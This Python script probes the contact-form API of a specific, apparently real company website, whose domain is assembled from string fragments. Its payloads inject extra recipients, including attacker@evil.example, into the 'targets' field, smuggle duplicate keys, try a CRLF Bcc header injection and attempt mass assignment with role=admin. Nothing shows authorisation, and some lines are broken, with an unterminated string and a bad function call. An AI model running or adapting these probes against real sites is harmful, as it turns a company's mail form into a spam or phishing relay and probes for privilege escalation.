import requests, time
HOST = "infinity" + "capital" + ".bh"
BASE = "https://www." + HOST + "/api" + "/send"
EMAIL = "info" + "@" + HOST
H = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
     "Referer": "https://www." + HOST + "/contact"}

def send(over, label=""):
    d = {"fname": "James", "lname": "Tester", "areacode": "+973", "tel": "3612345",
         "cname": "James Tester", "subject": "Investment Opportunities",
         "msg": "hello there", "check": "", "targets": EMAIL}
    d.update(over)
    t0 = time.time()
    try:
        r = requests.post(BASE, data=d, headers=H, timeout=25, allow_redirects=False)
        print("%-38s %-5s t=%-5s %s" % (label or str(over)[:38], r.status_code,
              round(time.time()-t0, 2), r.text[:200].replace("\n", " ")))
        return r
    except Exception as e:
        print("%-38s ERR %s" % (label or str(over)[:38], str(e)[:120]))

print("### targets field: email relay / header injection / mass assignment")
send({"targets": EMAIL + ", attacker@evil.example"}, "multi-recipient CSV")
send({"targets": EMAIL + ">, victim@evil.example"}, "display-name/CC trick")
send({"targets": 'attacker@evil.example"}, "single external address")
send({"targets": EMAIL}, "legit single (control)")
send({"targets": "not-an-email"}, "invalid email")
send({"targets": [EMAIL, "attacker@evil.example"]}, "array of recipients (repeat param)")
send({"targets": EMAIL}, label="dup param injection", **{
    "__extra": None})

# multipart / duplicate-key smuggling: send targets twice
import urllib.request, urllib.parse
def raw_post(body, ct="application/x-www-form-urlencoded"):
    req = urllib.request.Request(BASE, data=body.encode(), headers={**H, "Content-Type": ct})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read()[:200].decode(errors="replace")
    except Exception as e:
        try:
            return e.code, e.read()[:200].decode(errors="replace")
        except Exception:
            return "ERR", str(e)[:120]

base = "fname=James&lname=Tester&areacode=%2B973&tel=3612345&cname=James+Tester&subject=Test&msg=hi&check="
print("### duplicate-key smuggling")
print("targets dup      :", raw_post(base + "targets=" + urllib.parse.quote(EMAIL) + "&targets=attacker%40evil.example"))
print("### CRLF in targets")
print("targets CRLF     :", raw_post(base + "targets=" + urllib.parse.quote("a@b.com\r\nBcc: x@y.com")))
print("### targets as JSON array string")
print("targets json     :", raw_post(base + "targets=" + urllib.parse.quote('["a@b.com","c@d.com"]')))
print("### __proto__ / mass assignment in form")
print("role=admin       :", raw_post(base + "targets=" + urllib.parse.quote(EMAIL) + "&role=admin&isAdmin=true"))